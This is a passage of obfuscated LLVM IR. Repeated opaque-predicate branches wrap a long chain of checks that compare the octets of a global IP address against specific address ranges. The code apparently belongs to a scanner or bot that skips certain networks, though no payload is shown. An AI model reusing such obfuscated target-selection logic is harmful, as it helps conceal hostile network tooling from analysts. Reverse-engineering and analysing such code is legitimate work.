  %4366 = urem i32 %4365, 2
  %4367 = icmp eq i32 %4366, 0
  %4368 = icmp slt i32 %4363, 10
  %4369 = or i1 %4367, %4368
  br i1 %4369, label %originalBBpart2603, label %originalBB601alteredBB

originalBBpart2603:                               ; preds = %originalBB601
  br i1 %4361, label %4370, label %4382

; <label>:4370:                                   ; preds = %originalBBpart2603
  %4371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4372 = zext i8 %4371 to i32
  %4373 = icmp eq i32 %4372, 93
  br i1 %4373, label %4374, label %4382

; <label>:4374:                                   ; preds = %4370
  %4375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4376 = zext i8 %4375 to i32
  %4377 = icmp sge i32 %4376, 192
  br i1 %4377, label %4378, label %4382

; <label>:4378:                                   ; preds = %4374
  %4379 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4380 = zext i8 %4379 to i32
  %4381 = icmp slt i32 %4380, 193
  br i1 %4381, label %5234, label %4382

; <label>:4382:                                   ; preds = %4378, %4374, %4370, %originalBBpart2603
  %4383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4384 = zext i8 %4383 to i32
  %4385 = icmp eq i32 %4384, 66
  br i1 %4385, label %4386, label %4398

; <label>:4386:                                   ; preds = %4382
  %4387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4388 = zext i8 %4387 to i32
  %4389 = icmp eq i32 %4388, 71
  br i1 %4389, label %4390, label %4398

; <label>:4390:                                   ; preds = %4386
  %4391 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4392 = zext i8 %4391 to i32
  %4393 = icmp sge i32 %4392, 240
  br i1 %4393, label %4394, label %4398

; <label>:4394:                                   ; preds = %4390
  %4395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4396 = zext i8 %4395 to i32
  %4397 = icmp slt i32 %4396, 255
  br i1 %4397, label %5234, label %4398

; <label>:4398:                                   ; preds = %4394, %4390, %4386, %4382
  %4399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4400 = zext i8 %4399 to i32
  %4401 = icmp eq i32 %4400, 98
  br i1 %4401, label %4402, label %4430

; <label>:4402:                                   ; preds = %4398
  %4403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4404 = zext i8 %4403 to i32
  %4405 = icmp eq i32 %4404, 142
  br i1 %4405, label %4406, label %4430

; <label>:4406:                                   ; preds = %4402
  %4407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4408 = zext i8 %4407 to i32
  %4409 = icmp sge i32 %4408, 208
  br i1 %4409, label %4410, label %4430

; <label>:4410:                                   ; preds = %4406
  %4411 = load i32, i32* @x.71
  %4412 = load i32, i32* @y.72
  %4413 = sub i32 %4411, 1
  %4414 = mul i32 %4411, %4413
  %4415 = urem i32 %4414, 2
  %4416 = icmp eq i32 %4415, 0
  %4417 = icmp slt i32 %4412, 10
  %4418 = or i1 %4416, %4417
  br i1 %4418, label %originalBB605, label %originalBB605alteredBB

originalBB605:                                    ; preds = %originalBB605alteredBB, %4410
  %4419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4420 = zext i8 %4419 to i32
  %4421 = icmp slt i32 %4420, 223
  %4422 = load i32, i32* @x.71
  %4423 = load i32, i32* @y.72
  %4424 = sub i32 %4422, 1
  %4425 = mul i32 %4422, %4424
  %4426 = urem i32 %4425, 2
  %4427 = icmp eq i32 %4426, 0
  %4428 = icmp slt i32 %4423, 10
  %4429 = or i1 %4427, %4428
  br i1 %4429, label %originalBBpart2607, label %originalBB605alteredBB

originalBBpart2607:                               ; preds = %originalBB605
  br i1 %4421, label %5234, label %4430

; <label>:4430:                                   ; preds = %originalBBpart2607, %4406, %4402, %4398
  %4431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4432 = zext i8 %4431 to i32
  %4433 = icmp eq i32 %4432, 107
  br i1 %4433, label %4434, label %4442

; <label>:4434:                                   ; preds = %4430
  %4435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4436 = zext i8 %4435 to i32
  %4437 = icmp sge i32 %4436, 20
  br i1 %4437, label %4438, label %4442

; <label>:4438:                                   ; preds = %4434
  %4439 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4440 = zext i8 %4439 to i32
  %4441 = icmp slt i32 %4440, 24
  br i1 %4441, label %5234, label %4442

; <label>:4442:                                   ; preds = %4438, %4434, %4430
  %4443 = load i32, i32* @x.71
  %4444 = load i32, i32* @y.72
  %4445 = sub i32 %4443, 1
  %4446 = mul i32 %4443, %4445
  %4447 = urem i32 %4446, 2
  %4448 = icmp eq i32 %4447, 0
  %4449 = icmp slt i32 %4444, 10
  %4450 = or i1 %4448, %4449
  br i1 %4450, label %originalBB609, label %originalBB609alteredBB

originalBB609:                                    ; preds = %originalBB609alteredBB, %4442
  %4451 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4452 = zext i8 %4451 to i32
  %4453 = icmp eq i32 %4452, 35
  %4454 = load i32, i32* @x.71
  %4455 = load i32, i32* @y.72
  %4456 = sub i32 %4454, 1
  %4457 = mul i32 %4454, %4456
  %4458 = urem i32 %4457, 2
  %4459 = icmp eq i32 %4458, 0
  %4460 = icmp slt i32 %4455, 10
  %4461 = or i1 %4459, %4460
  br i1 %4461, label %originalBBpart2611, label %originalBB609alteredBB

originalBBpart2611:                               ; preds = %originalBB609
  br i1 %4453, label %4462, label %4486

; <label>:4462:                                   ; preds = %originalBBpart2611
  %4463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4464 = zext i8 %4463 to i32
  %4465 = icmp sge i32 %4464, 159
  br i1 %4465, label %4466, label %4486

; <label>:4466:                                   ; preds = %4462
  %4467 = load i32, i32* @x.71
  %4468 = load i32, i32* @y.72
  %4469 = sub i32 %4467, 1
  %4470 = mul i32 %4467, %4469
  %4471 = urem i32 %4470, 2
  %4472 = icmp eq i32 %4471, 0
  %4473 = icmp slt i32 %4468, 10
  %4474 = or i1 %4472, %4473
  br i1 %4474, label %originalBB613, label %originalBB613alteredBB

originalBB613:                                    ; preds = %originalBB613alteredBB, %4466
  %4475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4476 = zext i8 %4475 to i32
  %4477 = icmp slt i32 %4476, 183
  %4478 = load i32, i32* @x.71
  %4479 = load i32, i32* @y.72
  %4480 = sub i32 %4478, 1
  %4481 = mul i32 %4478, %4480
  %4482 = urem i32 %4481, 2
  %4483 = icmp eq i32 %4482, 0
  %4484 = icmp slt i32 %4479, 10
  %4485 = or i1 %4483, %4484
  br i1 %4485, label %originalBBpart2615, label %originalBB613alteredBB

originalBBpart2615:                               ; preds = %originalBB613
  br i1 %4477, label %5234, label %4486

; <label>:4486:                                   ; preds = %originalBBpart2615, %4462, %originalBBpart2611
  %4487 = load i32, i32* @x.71
  %4488 = load i32, i32* @y.72
  %4489 = sub i32 %4487, 1
  %4490 = mul i32 %4487, %4489
  %4491 = urem i32 %4490, 2
  %4492 = icmp eq i32 %4491, 0
  %4493 = icmp slt i32 %4488, 10
  %4494 = or i1 %4492, %4493
  br i1 %4494, label %originalBB617, label %originalBB617alteredBB

originalBB617:                                    ; preds = %originalBB617alteredBB, %4486
  %4495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4496 = zext i8 %4495 to i32
  %4497 = icmp eq i32 %4496, 52
  %4498 = load i32, i32* @x.71
  %4499 = load i32, i32* @y.72
  %4500 = sub i32 %4498, 1
  %4501 = mul i32 %4498, %4500
  %4502 = urem i32 %4501, 2
  %4503 = icmp eq i32 %4502, 0
  %4504 = icmp slt i32 %4499, 10
  %4505 = or i1 %4503, %4504
  br i1 %4505, label %originalBBpart2619, label %originalBB617alteredBB

originalBBpart2619:                               ; preds = %originalBB617
  br i1 %4497, label %4506, label %4514

; <label>:4506:                                   ; preds = %originalBBpart2619
  %4507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4508 = zext i8 %4507 to i32
  %4509 = icmp sge i32 %4508, 1
  br i1 %4509, label %4510, label %4514

; <label>:4510:                                   ; preds = %4506
  %4511 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4512 = zext i8 %4511 to i32
  %4513 = icmp slt i32 %4512, 95
  br i1 %4513, label %5234, label %4514

; <label>:4514:                                   ; preds = %4510, %4506, %originalBBpart2619
  %4515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4516 = zext i8 %4515 to i32
  %4517 = icmp eq i32 %4516, 52
  br i1 %4517, label %4518, label %4526

; <label>:4518:                                   ; preds = %4514
  %4519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4520 = zext i8 %4519 to i32
  %4521 = icmp sge i32 %4520, 95
  br i1 %4521, label %4522, label %4526

; <label>:4522:                                   ; preds = %4518
  %4523 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4524 = zext i8 %4523 to i32
  %4525 = icmp slt i32 %4524, 255
  br i1 %4525, label %5234, label %4526

; <label>:4526:                                   ; preds = %4522, %4518, %4514
  %4527 = load i32, i32* @x.71
  %4528 = load i32, i32* @y.72
  %4529 = sub i32 %4527, 1
  %4530 = mul i32 %4527, %4529
  %4531 = urem i32 %4530, 2
  %4532 = icmp eq i32 %4531, 0
  %4533 = icmp slt i32 %4528, 10
  %4534 = or i1 %4532, %4533
  br i1 %4534, label %originalBB621, label %originalBB621alteredBB

originalBB621:                                    ; preds = %originalBB621alteredBB, %4526
  %4535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4536 = zext i8 %4535 to i32
  %4537 = icmp eq i32 %4536, 54
  %4538 = load i32, i32* @x.71
  %4539 = load i32, i32* @y.72
  %4540 = sub i32 %4538, 1
  %4541 = mul i32 %4538, %4540
  %4542 = urem i32 %4541, 2
  %4543 = icmp eq i32 %4542, 0
  %4544 = icmp slt i32 %4539, 10
  %4545 = or i1 %4543, %4544
  br i1 %4545, label %originalBBpart2623, label %originalBB621alteredBB

originalBBpart2623:                               ; preds = %originalBB621
  br i1 %4537, label %4546, label %4570

; <label>:4546:                                   ; preds = %originalBBpart2623
  %4547 = load i32, i32* @x.71
  %4548 = load i32, i32* @y.72
  %4549 = sub i32 %4547, 1
  %4550 = mul i32 %4547, %4549
  %4551 = urem i32 %4550, 2
  %4552 = icmp eq i32 %4551, 0
  %4553 = icmp slt i32 %4548, 10
  %4554 = or i1 %4552, %4553
  br i1 %4554, label %originalBB625, label %originalBB625alteredBB

originalBB625:                                    ; preds = %originalBB625alteredBB, %4546
  %4555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4556 = zext i8 %4555 to i32
  %4557 = icmp sge i32 %4556, 64
  %4558 = load i32, i32* @x.71
  %4559 = load i32, i32* @y.72
  %4560 = sub i32 %4558, 1
  %4561 = mul i32 %4558, %4560
  %4562 = urem i32 %4561, 2
  %4563 = icmp eq i32 %4562, 0
  %4564 = icmp slt i32 %4559, 10
  %4565 = or i1 %4563, %4564
  br i1 %4565, label %originalBBpart2627, label %originalBB625alteredBB

originalBBpart2627:                               ; preds = %originalBB625
  br i1 %4557, label %4566, label %4570

; <label>:4566:                                   ; preds = %originalBBpart2627
  %4567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4568 = zext i8 %4567 to i32
  %4569 = icmp slt i32 %4568, 95
  br i1 %4569, label %5234, label %4570

; <label>:4570:                                   ; preds = %4566, %originalBBpart2627, %originalBBpart2623
  %4571 = load i32, i32* @x.71
  %4572 = load i32, i32* @y.72
  %4573 = sub i32 %4571, 1
  %4574 = mul i32 %4571, %4573
  %4575 = urem i32 %4574, 2
  %4576 = icmp eq i32 %4575, 0
  %4577 = icmp slt i32 %4572, 10
  %4578 = or i1 %4576, %4577
  br i1 %4578, label %originalBB629, label %originalBB629alteredBB

originalBB629:                                    ; preds = %originalBB629alteredBB, %4570
  %4579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4580 = zext i8 %4579 to i32
  %4581 = icmp eq i32 %4580, 54
  %4582 = load i32, i32* @x.71
  %4583 = load i32, i32* @y.72
  %4584 = sub i32 %4582, 1
  %4585 = mul i32 %4582, %4584
  %4586 = urem i32 %4585, 2
  %4587 = icmp eq i32 %4586, 0
  %4588 = icmp slt i32 %4583, 10
  %4589 = or i1 %4587, %4588
  br i1 %4589, label %originalBBpart2631, label %originalBB629alteredBB

originalBBpart2631:                               ; preds = %originalBB629
  br i1 %4581, label %4590, label %4614

; <label>:4590:                                   ; preds = %originalBBpart2631
  %4591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4592 = zext i8 %4591 to i32
  %4593 = icmp sge i32 %4592, 144
  br i1 %4593, label %4594, label %4614

; <label>:4594:                                   ; preds = %4590
  %4595 = load i32, i32* @x.71
  %4596 = load i32, i32* @y.72
  %4597 = sub i32 %4595, 1
  %4598 = mul i32 %4595, %4597
  %4599 = urem i32 %4598, 2
  %4600 = icmp eq i32 %4599, 0
  %4601 = icmp slt i32 %4596, 10
  %4602 = or i1 %4600, %4601
  br i1 %4602, label %originalBB633, label %originalBB633alteredBB

originalBB633:                                    ; preds = %originalBB633alteredBB, %4594
  %4603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4604 = zext i8 %4603 to i32
  %4605 = icmp slt i32 %4604, 255
  %4606 = load i32, i32* @x.71
  %4607 = load i32, i32* @y.72
  %4608 = sub i32 %4606, 1
  %4609 = mul i32 %4606, %4608
  %4610 = urem i32 %4609, 2
  %4611 = icmp eq i32 %4610, 0
  %4612 = icmp slt i32 %4607, 10
  %4613 = or i1 %4611, %4612
  br i1 %4613, label %originalBBpart2635, label %originalBB633alteredBB

originalBBpart2635:                               ; preds = %originalBB633
  br i1 %4605, label %5234, label %4614

; <label>:4614:                                   ; preds = %originalBBpart2635, %4590, %originalBBpart2631
  %4615 = load i32, i32* @x.71
  %4616 = load i32, i32* @y.72
  %4617 = sub i32 %4615, 1
  %4618 = mul i32 %4615, %4617
  %4619 = urem i32 %4618, 2
  %4620 = icmp eq i32 %4619, 0
  %4621 = icmp slt i32 %4616, 10
  %4622 = or i1 %4620, %4621
  br i1 %4622, label %originalBB637, label %originalBB637alteredBB

originalBB637:                                    ; preds = %originalBB637alteredBB, %4614
  %4623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4624 = zext i8 %4623 to i32
  %4625 = icmp eq i32 %4624, 13
  %4626 = load i32, i32* @x.71
  %4627 = load i32, i32* @y.72
  %4628 = sub i32 %4626, 1
  %4629 = mul i32 %4626, %4628
  %4630 = urem i32 %4629, 2
  %4631 = icmp eq i32 %4630, 0
  %4632 = icmp slt i32 %4627, 10
  %4633 = or i1 %4631, %4632
  br i1 %4633, label %originalBBpart2639, label %originalBB637alteredBB

originalBBpart2639:                               ; preds = %originalBB637
  br i1 %4625, label %4634, label %4658

; <label>:4634:                                   ; preds = %originalBBpart2639
  %4635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4636 = zext i8 %4635 to i32
  %4637 = icmp sge i32 %4636, 52
  br i1 %4637, label %4638, label %4658

; <label>:4638:                                   ; preds = %4634
  %4639 = load i32, i32* @x.71
  %4640 = load i32, i32* @y.72
  %4641 = sub i32 %4639, 1
  %4642 = mul i32 %4639, %4641
  %4643 = urem i32 %4642, 2
  %4644 = icmp eq i32 %4643, 0
  %4645 = icmp slt i32 %4640, 10
  %4646 = or i1 %4644, %4645
  br i1 %4646, label %originalBB641, label %originalBB641alteredBB

originalBB641:                                    ; preds = %originalBB641alteredBB, %4638
  %4647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4648 = zext i8 %4647 to i32
  %4649 = icmp slt i32 %4648, 60
  %4650 = load i32, i32* @x.71
  %4651 = load i32, i32* @y.72
  %4652 = sub i32 %4650, 1
  %4653 = mul i32 %4650, %4652
  %4654 = urem i32 %4653, 2
  %4655 = icmp eq i32 %4654, 0
  %4656 = icmp slt i32 %4651, 10
  %4657 = or i1 %4655, %4656
  br i1 %4657, label %originalBBpart2643, label %originalBB641alteredBB

originalBBpart2643:                               ; preds = %originalBB641
  br i1 %4649, label %5234, label %4658

; <label>:4658:                                   ; preds = %originalBBpart2643, %4634, %originalBBpart2639
  %4659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4660 = zext i8 %4659 to i32
  %4661 = icmp eq i32 %4660, 13
  br i1 %4661, label %4662, label %4686

; <label>:4662:                                   ; preds = %4658
  %4663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4664 = zext i8 %4663 to i32
  %4665 = icmp sge i32 %4664, 112
  br i1 %4665, label %4666, label %4686

; <label>:4666:                                   ; preds = %4662
  %4667 = load i32, i32* @x.71
  %4668 = load i32, i32* @y.72
  %4669 = sub i32 %4667, 1
  %4670 = mul i32 %4667, %4669
  %4671 = urem i32 %4670, 2
  %4672 = icmp eq i32 %4671, 0
  %4673 = icmp slt i32 %4668, 10
  %4674 = or i1 %4672, %4673
  br i1 %4674, label %originalBB645, label %originalBB645alteredBB

originalBB645:                                    ; preds = %originalBB645alteredBB, %4666
  %4675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4676 = zext i8 %4675 to i32
  %4677 = icmp slt i32 %4676, 115
  %4678 = load i32, i32* @x.71
  %4679 = load i32, i32* @y.72
  %4680 = sub i32 %4678, 1
  %4681 = mul i32 %4678, %4680
  %4682 = urem i32 %4681, 2
  %4683 = icmp eq i32 %4682, 0
  %4684 = icmp slt i32 %4679, 10
  %4685 = or i1 %4683, %4684
  br i1 %4685, label %originalBBpart2647, label %originalBB645alteredBB

originalBBpart2647:                               ; preds = %originalBB645
  br i1 %4677, label %5234, label %4686

; <label>:4686:                                   ; preds = %originalBBpart2647, %4662, %4658
  %4687 = load i32, i32* @x.71
  %4688 = load i32, i32* @y.72
  %4689 = sub i32 %4687, 1
  %4690 = mul i32 %4687, %4689
  %4691 = urem i32 %4690, 2
  %4692 = icmp eq i32 %4691, 0
  %4693 = icmp slt i32 %4688, 10
  %4694 = or i1 %4692, %4693
  br i1 %4694, label %originalBB649, label %originalBB649alteredBB

originalBB649:                                    ; preds = %originalBB649alteredBB, %4686
  %4695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4696 = zext i8 %4695 to i32
  %4697 = icmp eq i32 %4696, 163
  %4698 = load i32, i32* @x.71
  %4699 = load i32, i32* @y.72
  %4700 = sub i32 %4698, 1
  %4701 = mul i32 %4698, %4700
  %4702 = urem i32 %4701, 2
  %4703 = icmp eq i32 %4702, 0
  %4704 = icmp slt i32 %4699, 10
  %4705 = or i1 %4703, %4704
  br i1 %4705, label %originalBBpart2651, label %originalBB649alteredBB

originalBBpart2651:                               ; preds = %originalBB649
  br i1 %4697, label %4706, label %4710

; <label>:4706:                                   ; preds = %originalBBpart2651
  %4707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4708 = zext i8 %4707 to i32
  %4709 = icmp eq i32 %4708, 172
  br i1 %4709, label %5234, label %4710

; <label>:4710:                                   ; preds = %4706, %originalBBpart2651
  %4711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4712 = zext i8 %4711 to i32
  %4713 = icmp eq i32 %4712, 51
  br i1 %4713, label %4714, label %4738

; <label>:4714:                                   ; preds = %4710
  %4715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4716 = zext i8 %4715 to i32
  %4717 = icmp sge i32 %4716, 15
  br i1 %4717, label %4718, label %4738

; <label>:4718:                                   ; preds = %4714
  %4719 = load i32, i32* @x.71
  %4720 = load i32, i32* @y.72
  %4721 = sub i32 %4719, 1
  %4722 = mul i32 %4719, %4721
  %4723 = urem i32 %4722, 2
  %4724 = icmp eq i32 %4723, 0
  %4725 = icmp slt i32 %4720, 10
  %4726 = or i1 %4724, %4725
  br i1 %4726, label %originalBB653, label %originalBB653alteredBB

originalBB653:                                    ; preds = %originalBB653alteredBB, %4718
  %4727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4728 = zext i8 %4727 to i32
  %4729 = icmp slt i32 %4728, 255
  %4730 = load i32, i32* @x.71
  %4731 = load i32, i32* @y.72
  %4732 = sub i32 %4730, 1
  %4733 = mul i32 %4730, %4732
  %4734 = urem i32 %4733, 2
  %4735 = icmp eq i32 %4734, 0
  %4736 = icmp slt i32 %4731, 10
  %4737 = or i1 %4735, %4736
  br i1 %4737, label %originalBBpart2655, label %originalBB653alteredBB

originalBBpart2655:                               ; preds = %originalBB653
  br i1 %4729, label %5234, label %4738

; <label>:4738:                                   ; preds = %originalBBpart2655, %4714, %4710
  %4739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4740 = zext i8 %4739 to i32
  %4741 = icmp eq i32 %4740, 79
  br i1 %4741, label %4742, label %4770

; <label>:4742:                                   ; preds = %4738
  %4743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4744 = zext i8 %4743 to i32
  %4745 = icmp eq i32 %4744, 121
  br i1 %4745, label %4746, label %4770

; <label>:4746:                                   ; preds = %4742
  %4747 = load i32, i32* @x.71
  %4748 = load i32, i32* @y.72
  %4749 = sub i32 %4747, 1
  %4750 = mul i32 %4747, %4749
  %4751 = urem i32 %4750, 2
  %4752 = icmp eq i32 %4751, 0
  %4753 = icmp slt i32 %4748, 10
  %4754 = or i1 %4752, %4753
  br i1 %4754, label %originalBB657, label %originalBB657alteredBB

originalBB657:                                    ; preds = %originalBB657alteredBB, %4746
  %4755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4756 = zext i8 %4755 to i32
  %4757 = icmp sge i32 %4756, 128
  %4758 = load i32, i32* @x.71
  %4759 = load i32, i32* @y.72
  %4760 = sub i32 %4758, 1
  %4761 = mul i32 %4758, %4760
  %4762 = urem i32 %4761, 2
  %4763 = icmp eq i32 %4762, 0
  %4764 = icmp slt i32 %4759, 10
  %4765 = or i1 %4763, %4764
  br i1 %4765, label %originalBBpart2659, label %originalBB657alteredBB

originalBBpart2659:                               ; preds = %originalBB657
  br i1 %4757, label %4766, label %4770

; <label>:4766:                                   ; preds = %originalBBpart2659
  %4767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4768 = zext i8 %4767 to i32
  %4769 = icmp slt i32 %4768, 255
  br i1 %4769, label %5234, label %4770

; <label>:4770:                                   ; preds = %4766, %originalBBpart2659, %4742, %4738
  %4771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4772 = zext i8 %4771 to i32
  %4773 = icmp eq i32 %4772, 212
  br i1 %4773, label %4774, label %4818

; <label>:4774:                                   ; preds = %4770
  %4775 = load i32, i32* @x.71
  %4776 = load i32, i32* @y.72
  %4777 = sub i32 %4775, 1
  %4778 = mul i32 %4775, %4777
  %4779 = urem i32 %4778, 2
  %4780 = icmp eq i32 %4779, 0
  %4781 = icmp slt i32 %4776, 10
  %4782 = or i1 %4780, %4781
  br i1 %4782, label %originalBB661, label %originalBB661alteredBB

originalBB661:                                    ; preds = %originalBB661alteredBB, %4774
  %4783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4784 = zext i8 %4783 to i32
  %4785 = icmp eq i32 %4784, 47
  %4786 = load i32, i32* @x.71
  %4787 = load i32, i32* @y.72
  %4788 = sub i32 %4786, 1
  %4789 = mul i32 %4786, %4788
  %4790 = urem i32 %4789, 2
  %4791 = icmp eq i32 %4790, 0
  %4792 = icmp slt i32 %4787, 10
  %4793 = or i1 %4791, %4792
  br i1 %4793, label %originalBBpart2663, label %originalBB661alteredBB

originalBBpart2663:                               ; preds = %originalBB661
  br i1 %4785, label %4794, label %4818

; <label>:4794:                                   ; preds = %originalBBpart2663
  %4795 = load i32, i32* @x.71
  %4796 = load i32, i32* @y.72
  %4797 = sub i32 %4795, 1
  %4798 = mul i32 %4795, %4797
  %4799 = urem i32 %4798, 2
  %4800 = icmp eq i32 %4799, 0
  %4801 = icmp slt i32 %4796, 10
  %4802 = or i1 %4800, %4801
  br i1 %4802, label %originalBB665, label %originalBB665alteredBB

originalBB665:                                    ; preds = %originalBB665alteredBB, %4794
  %4803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4804 = zext i8 %4803 to i32
  %4805 = icmp sge i32 %4804, 224
  %4806 = load i32, i32* @x.71
  %4807 = load i32, i32* @y.72
  %4808 = sub i32 %4806, 1
  %4809 = mul i32 %4806, %4808
  %4810 = urem i32 %4809, 2
  %4811 = icmp eq i32 %4810, 0
  %4812 = icmp slt i32 %4807, 10
  %4813 = or i1 %4811, %4812
  br i1 %4813, label %originalBBpart2667, label %originalBB665alteredBB

originalBBpart2667:                               ; preds = %originalBB665
  br i1 %4805, label %4814, label %4818

; <label>:4814:                                   ; preds = %originalBBpart2667
  %4815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4816 = zext i8 %4815 to i32
  %4817 = icmp slt i32 %4816, 255
  br i1 %4817, label %5234, label %4818

; <label>:4818:                                   ; preds = %4814, %originalBBpart2667, %originalBBpart2663, %4770
  %4819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4820 = zext i8 %4819 to i32
  %4821 = icmp eq i32 %4820, 89
  br i1 %4821, label %4822, label %4866

; <label>:4822:                                   ; preds = %4818
  %4823 = load i32, i32* @x.71
  %4824 = load i32, i32* @y.72
  %4825 = sub i32 %4823, 1
  %4826 = mul i32 %4823, %4825
  %4827 = urem i32 %4826, 2
  %4828 = icmp eq i32 %4827, 0
  %4829 = icmp slt i32 %4824, 10
  %4830 = or i1 %4828, %4829
  br i1 %4830, label %originalBB669, label %originalBB669alteredBB

originalBB669:                                    ; preds = %originalBB669alteredBB, %4822
  %4831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4832 = zext i8 %4831 to i32
  %4833 = icmp eq i32 %4832, 34
  %4834 = load i32, i32* @x.71
  %4835 = load i32, i32* @y.72
  %4836 = sub i32 %4834, 1
  %4837 = mul i32 %4834, %4836
  %4838 = urem i32 %4837, 2
  %4839 = icmp eq i32 %4838, 0
  %4840 = icmp slt i32 %4835, 10
  %4841 = or i1 %4839, %4840
  br i1 %4841, label %originalBBpart2671, label %originalBB669alteredBB

originalBBpart2671:                               ; preds = %originalBB669
  br i1 %4833, label %4842, label %4866

; <label>:4842:                                   ; preds = %originalBBpart2671
  %4843 = load i32, i32* @x.71
  %4844 = load i32, i32* @y.72
  %4845 = sub i32 %4843, 1
  %4846 = mul i32 %4843, %4845
  %4847 = urem i32 %4846, 2
  %4848 = icmp eq i32 %4847, 0
  %4849 = icmp slt i32 %4844, 10
  %4850 = or i1 %4848, %4849
  br i1 %4850, label %originalBB673, label %originalBB673alteredBB

originalBB673:                                    ; preds = %originalBB673alteredBB, %4842
  %4851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4852 = zext i8 %4851 to i32
  %4853 = icmp sge i32 %4852, 96
  %4854 = load i32, i32* @x.71
  %4855 = load i32, i32* @y.72
  %4856 = sub i32 %4854, 1
  %4857 = mul i32 %4854, %4856
  %4858 = urem i32 %4857, 2
